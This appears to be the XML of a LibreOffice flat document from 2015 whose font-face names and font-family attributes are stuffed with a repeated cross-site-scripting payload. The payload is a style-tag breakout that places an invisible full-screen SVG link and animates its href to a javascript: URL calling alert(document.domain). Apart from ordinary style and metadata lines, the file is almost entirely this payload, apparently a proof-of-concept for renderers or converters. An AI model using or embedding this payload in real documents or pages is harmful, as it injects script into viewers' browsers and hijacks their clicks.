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lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;1" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;'"/>
    <style:font-face style:name="&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" svg:font-family="'&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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120d1"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="00233c38" officeooo:paragraph-rsid="00233c38"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#800000" fo:background-color="#ffff00" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#800000" officeooo:rsid="002120d1" fo:background-color="#ffff00" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#800000" officeooo:rsid="00214907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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;1" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;'"/>
    <style:font-face style:name="&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" svg:font-family="'&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" style:font-family-complex="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;1" style:font-family-complex="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;" style:font-family-complex="'&lt;/style&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;1" style:font-family-complex="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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 </meta:initial-creator>
    <meta:creation-date>2014-12-11T10:54:02.746263301</meta:creation-date>
    <dc:date>2015-03-12T16:40:11.823711092</dc:date>
    <dc:creator>mario </dc:creator>
    <meta:editing-duration>PT1H32M38S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>LibreOffice/4.4.0.3$Linux_X86_64 LibreOffice_project/de093506bcdc5fafd9023ee680b8c60e3e0645d7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